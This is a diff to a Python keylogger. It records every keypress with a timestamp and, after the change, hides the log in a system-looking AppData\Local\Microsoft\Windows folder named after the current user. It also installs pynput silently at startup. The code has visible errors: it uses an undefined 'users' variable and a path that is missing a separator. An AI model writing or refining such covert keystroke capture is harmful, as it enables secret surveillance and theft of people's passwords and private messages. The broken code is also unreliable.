@@ -3,15 +3,27 @@ from datetime import datetime as dt
 import time
 import threading
 import subprocess
+from os.path import exists
+import psutil
+
 
 killSwitch = False
 currTime = dt.now().strftime('%d/%m/%Y %H:%M:%S - ')
 letter = ''
 capsOn = False
 phrase = ''
-
+user = psutil.users()[0].name
+checked = False
 
 subprocess.call(['pip','install', 'pynput'])
+
+def checkFile():
+    global checked
+    if(not exists(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt")):
+        with open(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt", 'w+') as f:
+            f.write("KEYSTROKES\n")
+    checked = True
+
 
 def update():
     while True:
@@ -25,25 +37,33 @@ def update():
             return False
 
 
-threading.Thread(target=update).start()
-
 def writeToFile(text):
-    with open(r"C:\HomeSchool\folder123\appendtextfile.txt", 'a+') as f:
+    with open(r"C:\Users\\" + users +r"AppData\Local\Microsoft\Windows\textfile.txt", 'a+') as f:
         try:
             f.write(dt.now().strftime('%d/%m/%Y %H:%M:%S - ') + str(text) + '\n')
         except:
             global killSwitch
             killSwitch = True
 
+def kill_prog():
+    global killSwitch
+    killSwitch = True
+
+
+threading.Thread(target=update).start()
+
 
 def on_press(key):
     global capsOn
     global letter
     global phrase
+    global checked
     try:
         letter = '{0}'.format(key.char)
         if(capsOn):
             letter = letter.upper()
+        if(not checked):
+            checkFile()
     except AttributeError:
         match key:
             case keyboard.Key.ctrl_l | keyboard.Key.ctrl_r:
@@ -73,10 +93,6 @@ def on_press(key):
             
         
 def on_release(key):
-    #writeToFile('{0} released'.format(
-    #    key))
-    global capsOn
-    global letter
     global killSwitch
     try:
         if(killSwitch):
@@ -84,9 +100,6 @@ def on_release(key):
     except:
         print('operation could not commence TT')
             
-def kill_prog():
-    global killSwitch
-    killSwitch = True
 
 
 listener = keyboard.GlobalHotKeys({
